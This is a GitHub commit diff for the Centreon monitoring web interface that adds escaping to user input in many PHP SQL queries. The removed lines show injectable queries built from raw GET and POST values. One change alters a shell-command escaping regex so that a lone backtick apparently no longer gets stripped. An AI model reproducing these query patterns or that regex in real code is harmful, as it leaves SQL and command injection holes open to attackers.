|  |  | if (!is\_file($imgpath)) { |
| Expand Down | |  |

6 changes: 3 additions & 3 deletions

6
[www/include/configuration/configObject/command\_categories/DB-Func.php](#diff-4f378121488757f1691268e5966534da46fab9e915f10645d6b778bcf4f32c40 "www/include/configuration/configObject/command_categories/DB-Func.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/configuration/configObject/command_categories/DB-Func.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -46,7 +46,7 @@ function testCommandCategorieExistence ($name = NULL) { |
|  |  | if (isset($form)) |
|  |  | $id = $form->getSubmitValue('cmd\_category\_id'); |
|  |  |  |
|  |  | $DBRESULT = $pearDB->query("SELECT `category\_name`, `cmd\_category\_id` FROM `command\_categories` WHERE `category\_name` = '".htmlentities($name, ENT\_QUOTES, "UTF-8")."'"); |
|  |  | $DBRESULT = $pearDB->query("SELECT `category\_name`, `cmd\_category\_id` FROM `command\_categories` WHERE `category\_name` = '".$pearDB->escape($name)."'"); |
|  |  | $cat = $DBRESULT->fetchRow(); |
|  |  |  |
|  |  | if ($DBRESULT->numRows() >= 1 && $cat["cmd\_category\_id"] == $id) |
| Expand Down  Expand Up | | @@ -88,14 +88,14 @@ function insertCommandCategorieInDB(){ |
|  |  | global $pearDB; |
|  |  |  |
|  |  | if (testCommandCategorieExistence($\_POST["category\_name"])){ |
|  |  | $DBRESULT = $pearDB->query("INSERT INTO `command\_categories` (`category\_name` , `category\_alias`, `category\_order`) VALUES ('".$\_POST["category\_name"]."', '".$\_POST["category\_alias"]."', '1')"); |
|  |  | $DBRESULT = $pearDB->query("INSERT INTO `command\_categories` (`category\_name` , `category\_alias`, `category\_order`) VALUES ('".$pearDB->escape($\_POST["category\_name"])."', '".$pearDB->escape($\_POST["category\_alias"])."', '1')"); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | function updateCommandCategorieInDB(){ |
|  |  | global $pearDB; |
|  |  |  |
|  |  | $DBRESULT = $pearDB->query("UPDATE `command\_categories` SET `category\_name` = '".$\_POST["category\_name"]."' , `category\_alias` = '".$\_POST["category\_alias"]."' , `category\_order` = '".$\_POST["category\_order"]."' WHERE `cmd\_category\_id` = '".$\_POST["cmd\_category\_id"]."'"); |
|  |  | $DBRESULT = $pearDB->query("UPDATE `command\_categories` SET `category\_name` = '".$pearDB->escape($\_POST["category\_name"])."' , `category\_alias` = '".$pearDB->escape($\_POST["category\_alias"])."' , `category\_order` = '".$pearDB->escape($\_POST["category\_order"])."' WHERE `cmd\_category\_id` = '".$pearDB->escape($\_POST["cmd\_category\_id"])."'"); |
|  |  | } |
|  |  |  |
|  |  | function deleteCommandCategorieInDB($sc\_id = NULL){ |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[www/include/configuration/configObject/host\_template\_model/formHostTemplateModel.php](#diff-d100739ec2475175c5f1d2943ab011ac01d080561158aa5294bd57af706c98ab "www/include/configuration/configObject/host_template_model/formHostTemplateModel.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/configuration/configObject/host_template_model/formHostTemplateModel.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -152,7 +152,7 @@ |
|  |  | \*/ |
|  |  | $host\_tmplt\_who\_use\_me = array(); |
|  |  | if (isset($\_GET["host\_id"]) && $\_GET["host\_id"]){ |
|  |  | $DBRESULT = $pearDB->query("SELECT host\_id, host\_name FROM host WHERE host\_template\_model\_htm\_id = '".$\_GET["host\_id"]."'"); |
|  |  | $DBRESULT = $pearDB->query("SELECT host\_id, host\_name FROM host WHERE host\_template\_model\_htm\_id = '".$pearDB->escape($\_GET["host\_id"])."'"); |
|  |  | while($host\_tmpl\_father = $DBRESULT->fetchRow()) |
|  |  | $host\_tmplt\_who\_use\_me[$host\_tmpl\_father["host\_id"]] = $host\_tmpl\_father["host\_name"]; |
|  |  | $DBRESULT->free(); |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[www/include/configuration/configObject/service\_categories/DB-Func.php](#diff-594d87615431244ef369bd5958e75ac46bf21b0087d1a2105d33cbb8f0a50915 "www/include/configuration/configObject/service_categories/DB-Func.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/configuration/configObject/service_categories/DB-Func.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -134,11 +134,11 @@ function insertServiceCategorieInDB(){ |
|  |  |  |
|  |  | if (testServiceCategorieExistence($\_POST["sc\_name"])){ |
|  |  | $DBRESULT = $pearDB->query("INSERT INTO `service\_categories` (`sc\_name`, `sc\_description`, `level`, `icon\_id`, `sc\_activate` ) |
|  |  | VALUES ('".$\_POST["sc\_name"]."', '".$\_POST["sc\_description"]."', ". |
|  |  | VALUES ('".$pearDB->escape($\_POST["sc\_name"])."', '".$pearDB->escape($\_POST["sc\_description"])."', ". |
|  |  | (isset($\_POST['sc\_severity\_level']) && $\_POST['sc\_type'] ? $pearDB->escape($\_POST['sc\_severity\_level']):"NULL").", ". |
|  |  | (isset($\_POST['sc\_severity\_icon']) && $\_POST['sc\_type'] ? $pearDB->escape($\_POST['sc\_severity\_icon']) : "NULL").", ". |
|  |  | "'".$\_POST["sc\_activate"]["sc\_activate"]."')"); |
|  |  | $DBRESULT = $pearDB->query("SELECT MAX(sc\_id) FROM `service\_categories` WHERE sc\_name LIKE '".$\_POST["sc\_name"]."'"); |
|  |  | $DBRESULT = $pearDB->query("SELECT MAX(sc\_id) FROM `service\_categories` WHERE sc\_name LIKE '".$pearDB->escape($\_POST["sc\_name"])."'"); |
|  |  | $data = $DBRESULT->fetchRow(); |
|  |  | } |
|  |  | updateServiceCategoriesServices($data["MAX(sc\_id)"]); |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[www/include/configuration/configObject/service\_template\_model/formServiceTemplateModel.php](#diff-fd6e8202c61540470a92cc103238ffef7b45ed2d4afbc336821522a25e4d6c03 "www/include/configuration/configObject/service_template_model/formServiceTemplateModel.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/configuration/configObject/service_template_model/formServiceTemplateModel.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -186,7 +186,7 @@ function myDecodeSvTP($arg) { |
|  |  | \*/ |
|  |  | $svc\_tmplt\_who\_use\_me = array(); |
|  |  | if (isset($\_GET["service\_id"]) && $\_GET["service\_id"]) { |
|  |  | $DBRESULT = $pearDB->query("SELECT service\_description, service\_id FROM service WHERE service\_template\_model\_stm\_id = '".$\_GET["service\_id"]."'"); |
|  |  | $DBRESULT = $pearDB->query("SELECT service\_description, service\_id FROM service WHERE service\_template\_model\_stm\_id = '".$pearDB->escape($\_GET["service\_id"])."'"); |
|  |  | while ($service\_tmpl\_father = $DBRESULT->fetchRow()) { |
|  |  | $svc\_tmplt\_who\_use\_me[$service\_tmpl\_father["service\_id"]] = $service\_tmpl\_father["service\_description"]; |
|  |  | } |
| Expand All | | @@ -196,7 +196,7 @@ function myDecodeSvTP($arg) { |
|  |  | /\* |
|  |  | \* Service Templates comes from DB -> Store in $svTpls Array |
|  |  | \*/ |
|  |  | $svTpls = array(NULL=>NULL); |
|  |  | $svTpls = array(NULL => NULL); |
|  |  | $DBRESULT = $pearDB->query("SELECT service\_id, service\_description, service\_template\_model\_stm\_id FROM service WHERE service\_register = '0' AND service\_id != '".$service\_id."' ORDER BY service\_description"); |
|  |  | while ($svTpl = $DBRESULT->fetchRow()) { |
|  |  | if (!$svTpl["service\_description"]) { |
| Expand Down | |  |

78 changes: 40 additions & 38 deletions

78
[www/include/configuration/configObject/traps/GetXMLTrapsForVendor.php](#diff-0839bf5743691ee7c93ac0e40fb8be5047684ea740890d3cd4af6ab795d516f9 "www/include/configuration/configObject/traps/GetXMLTrapsForVendor.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/configuration/configObject/traps/GetXMLTrapsForVendor.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -36,46 +36,48 @@ |
|  |  | \* |
|  |  | \*/ |
|  |  |  |
|  |  | include\_once("@CENTREON\_ETC@/centreon.conf.php"); |
|  |  | include\_once("@CENTREON\_ETC@/centreon.conf.php"); |
|  |  |  |
|  |  | require\_once $centreon\_path . "/www/class/centreonDB.class.php"; |
|  |  | require\_once $centreon\_path . "/www/class/centreonXML.class.php"; |
|  |  | require\_once $centreon\_path . "/www/class/centreonDB.class.php"; |
|  |  | require\_once $centreon\_path . "/www/class/centreonXML.class.php"; |
|  |  |  |
|  |  | /\*\* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* |
|  |  | \* start init db |
|  |  | \*/ |
|  |  | $pearDB = new CentreonDB(); |
|  |  | /\*\* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* |
|  |  | \* start init db |
|  |  | \*/ |
|  |  | $pearDB = new CentreonDB(); |
|  |  |  |
|  |  | /\*\* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* |
|  |  | \* start XML Flow |
|  |  | \*/ |
|  |  | $buffer = new CentreonXML(); |
|  |  | $buffer->startElement("traps"); |
|  |  |  |
|  |  | $mnftr\_id = $pearDB->escape($\_POST["mnftr\_id"]); |
|  |  |  |
|  |  | /\*\* \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* |
|  |  | \* start XML Flow |
|  |  | \*/ |
|  |  | $buffer = new CentreonXML(); |
|  |  | $buffer->startElement("traps"); |
|  |  | $empty = 0; |
|  |  | if (isset($\_POST["mnftr\_id"])){ |
|  |  | $traps = array(); |
|  |  | if ($\_POST["mnftr\_id"] == -1) { |
|  |  | $DBRESULT = $pearDB->query("SELECT traps\_id, traps\_name FROM traps ORDER BY traps\_name"); |
|  |  | } else if ($\_POST["mnftr\_id"] == -2) { |
|  |  | $empty = 1; |
|  |  | } else if ($\_POST["mnftr\_id"] != 0) { |
|  |  | $DBRESULT = $pearDB->query("SELECT traps\_id, traps\_name FROM traps WHERE manufacturer\_id = " . $mnftr\_id . " ORDER BY traps\_name"); |
|  |  | } |
|  |  |  |
|  |  | $empty = 0; |
|  |  | if (isset($\_POST["mnftr\_id"])){ |
|  |  | $traps = array(); |
|  |  | if ($\_POST["mnftr\_id"] == -1) { |
|  |  | $DBRESULT = $pearDB->query("SELECT traps\_id, traps\_name FROM traps ORDER BY traps\_name"); |
|  |  | } else if ($\_POST["mnftr\_id"] == -2) { |
|  |  | $empty = 1; |
|  |  | } else if ($\_POST["mnftr\_id"] != 0) { |
|  |  | $DBRESULT = $pearDB->query("SELECT traps\_id, traps\_name FROM traps WHERE manufacturer\_id = " . $\_POST["mnftr\_id"]. " ORDER BY traps\_name"); |
|  |  | } |
|  |  | if ($empty != 1) { |
|  |  | while ($trap = $DBRESULT->fetchRow()){ |
|  |  | $buffer->startElement("trap"); |
|  |  | $buffer->writeElement("id", $trap["traps\_id"]); |
|  |  | $buffer->writeElement("name", $trap["traps\_name"]); |
|  |  | $buffer->endElement(); |
|  |  | } |
|  |  | $DBRESULT->free(); |
|  |  | } |
|  |  | } else { |
|  |  | $buffer->writeElement("error", "mnftr\_id not found"); |
|  |  | } |
|  |  | $buffer->endElement(); |
|  |  |  |
|  |  | if ($empty != 1) { |
|  |  | while ($trap = $DBRESULT->fetchRow()){ |
|  |  | $buffer->startElement("trap"); |
|  |  | $buffer->writeElement("id", $trap["traps\_id"]); |
|  |  | $buffer->writeElement("name", $trap["traps\_name"]); |
|  |  | $buffer->endElement(); |
|  |  | } |
|  |  | $DBRESULT->free(); |
|  |  | } |
|  |  | } else { |
|  |  | $buffer->writeElement("error", "mnftr\_id not found"); |
|  |  | } |
|  |  | $buffer->endElement(); |
|  |  | header('Content-Type: text/xml'); |
|  |  | $buffer->output(); |
|  |  | ?> |
|  |  | header('Content-Type: text/xml'); |
|  |  | $buffer->output(); |

2 changes: 1 addition & 1 deletion

2
[www/include/configuration/configObject/traps/xml/additionalRowXml.php](#diff-aa8dc8d2bf034e87faecdf26fd48850137159955e8afd247600e84772f132dac "www/include/configuration/configObject/traps/xml/additionalRowXml.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/configuration/configObject/traps/xml/additionalRowXml.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -52,7 +52,7 @@ |
|  |  | \*/ |
|  |  | require\_once ($centreon\_path . "www/class/centreonSession.class.php"); |
|  |  | require\_once ($centreon\_path . "www/class/centreon.class.php"); |
|  |  | if(!isset($\_SESSION['centreon'])) { |
|  |  | if (!isset($\_SESSION['centreon'])) { |
|  |  | CentreonSession::start(); |
|  |  | } |
|  |  |  |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[www/include/eventLogs/XmlTree/GetXmlTree.php](#diff-ccfb0edff1239f09b7e655ea46f9c138347769617d8b866d3b97879ecfa9a60e "www/include/eventLogs/XmlTree/GetXmlTree.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/eventLogs/XmlTree/GetXmlTree.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -171,7 +171,7 @@ function getServiceGroupSearch($search = NULL) { |
|  |  |  |
|  |  | $is\_admin = isUserAdmin($\_GET["sid"]); |
|  |  | if (isset($\_GET["sid"]) && $\_GET["sid"]) { |
|  |  | $DBRESULT = $pearDB->query("SELECT user\_id FROM session where session\_id = '".$\_GET["sid"]."'"); |
|  |  | $DBRESULT = $pearDB->query("SELECT user\_id FROM session where session\_id = '".$pearDB->escape($\_GET["sid"])."'"); |
|  |  | $session = $DBRESULT->fetchRow(); |
|  |  | $access = new CentreonAcl($session["user\_id"], $is\_admin); |
|  |  | $lca = array("LcaHost" => $access->getHostServices(($oreon->broker->getBroker() == "ndo" ? $pearDBndo : $pearDBO)), "LcaHostGroup" => $access->getHostGroups(), "LcaSG" => $access->getServiceGroups()); |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[www/include/options/accessLists/reloadACL/reloadACL.php](#diff-34babdfb1f647bb01a0294143039ef9e410c2a38c8c5b8f74496dff3aeba33ac "www/include/options/accessLists/reloadACL/reloadACL.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/options/accessLists/reloadACL/reloadACL.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -48,7 +48,7 @@ |
|  |  | require\_once 'HTML/QuickForm/Renderer/ArraySmarty.php'; |
|  |  |  |
|  |  | if (isset($\_GET["o"]) && $\_GET["o"] == "r"){ |
|  |  | $pearDB->query("UPDATE session SET update\_acl = '1' WHERE session\_id = '".$\_GET["session\_id"]."'"); |
|  |  | $pearDB->query("UPDATE session SET update\_acl = '1' WHERE session\_id = '".$pearDB->escape($\_GET["session\_id"])."'"); |
|  |  | $pearDB->query("UPDATE acl\_resources SET changed = '1'"); |
|  |  | $msg = new CentreonMsg(); |
|  |  | $msg->setTextStyle("bold"); |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[www/include/options/media/images/syncDir.php](#diff-e31825be08fcb98529069345d4b1bc33e27a1e68450002f25edfb888957bcbb6 "www/include/options/media/images/syncDir.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/options/media/images/syncDir.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -55,7 +55,7 @@ |
|  |  | exit ; |
|  |  |  |
|  |  | if (isset($\_GET["session\_id"])) { |
|  |  | $DBRESULT = $pearDB->query("SELECT \* FROM session WHERE session\_id = '".$\_GET["session\_id"]."'"); |
|  |  | $DBRESULT = $pearDB->query("SELECT \* FROM session WHERE session\_id = '".$pearDB->escape($\_GET["session\_id"])."'"); |
|  |  | if ($DBRESULT->numRows() == 0) |
|  |  | exit(); |
|  |  | } |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[www/include/options/session/connected\_user.php](#diff-2addd9d5118a61228263acead6642e1ec2475f3fde4241dac7328ae2a7a19201 "www/include/options/session/connected_user.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/options/session/connected_user.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -46,7 +46,7 @@ |
|  |  | require\_once "./class/centreonMsg.class.php"; |
|  |  |  |
|  |  | if (isset($\_GET["o"]) && $\_GET["o"] == "k"){ |
|  |  | $pearDB->query("DELETE FROM session WHERE session\_id = '".$\_GET["session\_id"]."'"); |
|  |  | $pearDB->query("DELETE FROM session WHERE session\_id = '".$pearDB->escape($\_GET["session\_id"])."'"); |
|  |  | $msg = new CentreonMsg(); |
|  |  | $msg->setTextStyle("bold"); |
|  |  | $msg->setText(\_("User kicked")); |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[www/include/views/graphs/GetXmlTree.php](#diff-91f9b0df873abebfe882f446b301395f395bfa9f9da7556ae8255661e348f63f "www/include/views/graphs/GetXmlTree.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/views/graphs/GetXmlTree.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -97,7 +97,7 @@ |
|  |  |  |
|  |  | $is\_admin = isUserAdmin($\_GET["sid"]); |
|  |  | if (isset($\_GET["sid"]) && $\_GET["sid"]){ |
|  |  | $DBRESULT = $pearDB->query("SELECT user\_id FROM session where session\_id = '".$\_GET["sid"]."'"); |
|  |  | $DBRESULT = $pearDB->query("SELECT user\_id FROM session where session\_id = '".$pearDB->escape($\_GET["sid"])."'"); |
|  |  | $session = $DBRESULT->fetchRow(); |
|  |  | $access = new CentreonAcl($session["user\_id"], $is\_admin); |
|  |  | $lca = array("LcaHost" => $access->getHostServices($pearDBndo), "LcaHostGroup" => $access->getHostGroups(), "LcaSG" => $access->getServiceGroups()); |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[www/include/views/graphs/common/makeXML\_ListMetrics.php](#diff-031e318a5dcc4b64375bb76351598fb726d46de16f0ba66997763713d0ed2a3f "www/include/views/graphs/common/makeXML_ListMetrics.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/views/graphs/common/makeXML_ListMetrics.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -90,7 +90,7 @@ function compare($a, $b) { |
|  |  | $where = " AND def\_type='".$\_GET["vdef"]."'"; |
|  |  |  |
|  |  | if (isset($\_GET["index\_id"]) && $\_GET["index\_id"] != 0) { |
|  |  | $pq\_sql = $pearDBO->query("SELECT metric\_id, metric\_name FROM metrics as ms, index\_data as ixd WHERE ms.index\_id = ixd.id and ms.index\_id='".$\_GET["index\_id"]."';"); |
|  |  | $pq\_sql = $pearDBO->query("SELECT metric\_id, metric\_name FROM metrics as ms, index\_data as ixd WHERE ms.index\_id = ixd.id and ms.index\_id='".$pearDB->escape($\_GET["index\_id"])."';"); |
|  |  | while($fw\_sql = $pq\_sql->fetchRow()) { |
|  |  | $sd\_l = strlen($fw\_sql["metric\_name"]); |
|  |  | $fw\_sql["metric\_name"] = $fw\_sql["metric\_name"]."&nbsp;&nbsp;&nbsp;"; |
| Expand All | | @@ -99,7 +99,7 @@ function compare($a, $b) { |
|  |  | $mx\_l = $sd\_l; |
|  |  | } |
|  |  | $pq\_sql->free(); |
|  |  | $pq\_sql = $pearDB->query("SELECT vmetric\_id, vmetric\_name, def\_type FROM virtual\_metrics WHERE index\_id='".$\_GET["index\_id"]."'".$where.";"); |
|  |  | $pq\_sql = $pearDB->query("SELECT vmetric\_id, vmetric\_name, def\_type FROM virtual\_metrics WHERE index\_id='".$pearDB->escape($\_GET["index\_id"])."'".$where.";"); |
|  |  |  |
|  |  | while($fw\_sql = $pq\_sql->fetchRow()) { |
|  |  | $sd\_l = strlen($fw\_sql["vmetric\_name"]." [CDEF]"); |
| Expand Down | |  |

9 changes: 6 additions & 3 deletions

9
[www/include/views/graphs/graphStatus/displayServiceStatus.php](#diff-d0eb982aafead76062667fc5cf92510a52d873794b2097286f3c13399a0d9d54 "www/include/views/graphs/graphStatus/displayServiceStatus.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/views/graphs/graphStatus/displayServiceStatus.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -36,7 +36,7 @@ |
|  |  | \* |
|  |  | \*/ |
|  |  | function escape\_command($command) { |
|  |  | return preg\_replace("/(\\\$|`)/", "", $command); |
|  |  | return preg\_replace("/(\\\$|;`)/", "", $command); |
|  |  | } |
|  |  |  |
|  |  | require\_once "@CENTREON\_ETC@/centreon.conf.php"; |
| Expand Down  Expand Up | | @@ -71,7 +71,7 @@ function getStatusDBDir($pearDBO){ |
|  |  | \* Verify if session is active |
|  |  | \*/ |
|  |  |  |
|  |  | $session = $pearDB->query("SELECT \* FROM `session` WHERE session\_id = '".$\_GET["session\_id"]."'"); |
|  |  | $session = $pearDB->query("SELECT \* FROM `session` WHERE session\_id = '".$pearDB->escape($\_GET["session\_id"])."'"); |
|  |  | if (!$session->numRows()){ |
|  |  |  |
|  |  | $image = imagecreate(250,100); |
| Expand Down  Expand Up | | @@ -142,8 +142,11 @@ function getStatusDBDir($pearDBO){ |
|  |  | /\* |
|  |  | \* get all template infos |
|  |  | \*/ |
|  |  | if (!is\_numeric($template\_id)) { |
|  |  | exit(); |
|  |  | } |
|  |  |  |
|  |  | $DBRESULT = $pearDB->query("SELECT \* FROM giv\_graphs\_template WHERE graph\_id = '".$template\_id."' LIMIT 1"); |
|  |  | $DBRESULT = $pearDB->query("SELECT \* FROM giv\_graphs\_template WHERE graph\_id = '".$pearDB->escape($template\_id)."' LIMIT 1"); |
|  |  | $GraphTemplate = $DBRESULT->fetchRow(); |
|  |  | if (is\_null($GraphTemplate)) |
|  |  | { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `cc21098`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcentreon%2Fcentreon%2Fcommit%2Fcc2109804dd69057cb209037113796ec5ffdce90) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


